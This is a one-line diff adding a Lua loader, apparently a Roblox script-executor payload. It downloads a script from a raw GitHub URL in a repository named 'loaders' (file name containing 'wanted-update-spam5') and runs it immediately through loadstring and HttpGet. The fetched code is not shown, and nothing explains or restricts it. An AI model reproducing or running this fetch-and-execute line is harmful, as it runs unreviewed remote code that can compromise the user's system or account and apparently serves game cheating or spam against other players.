@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/wanted-update-spam5-iurgcckgo9kkxg.lua"))()
